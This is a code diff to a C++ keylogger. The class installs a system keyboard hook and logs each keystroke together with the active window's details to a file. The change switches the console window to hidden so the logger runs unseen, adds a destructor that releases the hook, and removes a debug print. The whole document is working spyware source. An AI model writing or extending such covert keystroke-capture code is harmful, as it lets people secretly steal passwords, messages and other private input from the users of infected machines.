@@ -3,28 +3,35 @@
 
 #include <fstream>
 #include <iostream>
+#include <csignal>
 
 Keylogger::Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo& windowInfo, KeyInput& keyInput)
     : _outputFile (std::move(outputFile)), _manager(manager), _windowInfo(windowInfo), _keyInput(keyInput) {}
 
+Keylogger::Keylogger(std::ofstream&& outputFile):
+    _outputFile (std::move(outputFile)), _manager(*new OSManager()), _windowInfo(*new WindowInfo()), _keyInput(*new KeyInput(LoggingFormat::Default)) {}
+
+Keylogger::~Keylogger() {
+    HookManager::ReleaseHook();
+    _outputFile.close();
+}
+
 void Keylogger::Listen() {
-    std::cout << "entrou";
-    this->_manager.SetTerminalVisibility(true);
+    this->_manager.SetTerminalVisibility(false);
     HookManager::InstallKeyboardHook(this);
 
     keepRunning();
 }
 
-int Keylogger::LogKeyStroke(int keyStroke) {
-    if (_keyInput.IgnoreMouse(keyStroke)) return 0;
+void Keylogger::LogKeyStroke(int keyStroke) {
+    if (_keyInput.IgnoreMouse(keyStroke)) return;
 
     std::stringstream output;
     _windowInfo.GetActiveWindowInfo(output);
     _keyInput.FormatOutputBasedOnLogging(output, keyStroke);
     writeToOutput(output);
-
-    return 0;
 }
+
 
 void Keylogger::writeToOutput(std::stringstream& output) {
     _outputFile << output.str();
